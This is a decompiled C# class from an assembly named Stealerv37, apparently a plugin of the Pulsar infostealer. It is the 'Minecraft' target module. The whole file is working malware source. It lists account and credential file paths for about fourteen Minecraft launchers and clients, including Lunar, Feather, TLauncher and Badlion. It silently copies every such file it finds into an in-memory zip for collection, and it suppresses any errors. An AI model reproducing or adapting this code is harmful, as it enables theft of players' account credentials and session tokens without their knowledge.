// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Games.Minecraft
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.Collections.Generic;
using System.IO;

#nullable disable
namespace Intelix.Targets.Games;

public class Minecraft : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
    Dictionary<string, string> dictionary = new Dictionary<string, string>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
    dictionary.Add("Intent", Path.Combine(environmentVariable, "intentlauncher", "launcherconfig"));
    dictionary.Add("Lunar", Path.Combine(environmentVariable, ".lunarclient", "settings", "game", "accounts.json"));
    dictionary.Add("TLauncher", Path.Combine(folderPath, ".minecraft", "TlauncherProfiles.json"));
    dictionary.Add("Feather", Path.Combine(folderPath, ".feather", "accounts.json"));
    dictionary.Add("Meteor", Path.Combine(folderPath, ".minecraft", "meteor-client", "accounts.nbt"));
    dictionary.Add("Impact", Path.Combine(folderPath, ".minecraft", "Impact", "alts.json"));
    dictionary.Add("Novoline", Path.Combine(folderPath, ".minecraft", "Novoline", "alts.novo"));
    dictionary.Add("CheatBreakers", Path.Combine(folderPath, ".minecraft", "cheatbreaker_accounts.json"));
    dictionary.Add("Microsoft Store", Path.Combine(folderPath, ".minecraft", "launcher_accounts_microsoft_store.json"));
    dictionary.Add("Rise", Path.Combine(folderPath, ".minecraft", "Rise", "alts.txt"));
    dictionary.Add("Rise (Intent)", Path.Combine(environmentVariable, "intentlauncher", "Rise", "alts.txt"));
    dictionary.Add("Paladium", Path.Combine(folderPath, "paladium-group", "accounts.json"));
    dictionary.Add("PolyMC", Path.Combine(folderPath, "PolyMC", "accounts.json"));
    dictionary.Add("Badlion", Path.Combine(folderPath, "Badlion Client", "accounts.json"));
    Counter.CounterApplications counterApplications = new Counter.CounterApplications()
    {
      Name = nameof (Minecraft)
    };
    foreach (KeyValuePair<string, string> keyValuePair in dictionary)
    {
      if (File.Exists(keyValuePair.Value))
      {
        try
        {
          string entryPath = Path.Combine(Path.Combine(nameof (Minecraft), keyValuePair.Key), Path.GetFileName(keyValuePair.Value));
          zip.AddFile(entryPath, File.ReadAllBytes(keyValuePair.Value));
          counterApplications.Files.Add($"{keyValuePair.Value} => {entryPath}");
        }
        catch
        {
        }
      }
    }
    if (counterApplications.Files.Count <= 0)
      return;
    counterApplications.Files.Add("Minecraft\\");
    counter.Games.Add(counterApplications);
  }
}
